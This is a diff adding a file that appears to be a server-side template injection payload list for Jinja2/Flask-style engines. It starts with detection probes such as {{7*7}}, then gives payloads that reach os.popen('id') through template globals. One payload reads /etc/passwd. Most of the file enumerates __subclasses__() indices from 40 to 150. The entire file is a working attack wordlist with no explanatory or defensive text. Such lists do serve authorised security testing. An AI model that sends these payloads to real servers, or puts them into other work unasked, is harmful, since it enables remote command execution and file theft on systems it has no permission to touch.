@@ -1,0 +1,131 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{config}}
+{{self}}
+{{request}}
+{{7*'7'}}
+{{7*"7"}}
+{{''.__class__}}
+{{"".__class__}}
+{{"".__class__.__mro__[2].__subclasses__()}}
+${7*7}
+#{7*7}
+*{7*7}
+{{ cycler.__init__.__globals__.os.popen("id").read() }}
+{{ lipsum.__globals__["os"].popen("id").read() }}
+{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__bases__[0].__subclasses__() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ request.environ.__class__.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ url_for.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items() }}
+{{ request.application }}
+{{ request.environ }}
+{{ self.__dict__ }}
+{{ lipsum.__globals__ }}
+{{ cycler.__init__.__globals__ }}
+{{ joiner.__init__.__globals__ }}
+{{ namespace.__init__.__globals__ }}
+{{ config.__class__.__init__.__globals__ }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[59] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[60] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[61] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[62] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[63] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[64] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[65] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[66] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[67] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[68] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[69] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[70] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[71] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[72] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[73] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[74] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[75] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[76] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[77] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[78] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[79] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[80] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[81] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[82] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[83] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[84] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[85] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[86] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[87] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[88] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[89] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[90] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[91] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[92] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[93] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[94] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[95] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[96] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[97] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[98] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[99] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[100] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[101] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[102] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[103] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[104] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[105] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[106] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[107] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[108] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[109] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[110] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[111] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[112] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[113] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[114] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[115] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[116] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[117] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[118] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[119] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[120] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[121] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[122] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[123] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[124] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[125] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[126] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[127] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[128] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[129] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[130] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[131] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[132] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[133] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[134] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[135] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[136] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[137] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[138] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[139] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[140] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[141] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[142] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[143] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[144] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[145] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[146] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[147] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[148] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[149] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[150] }}
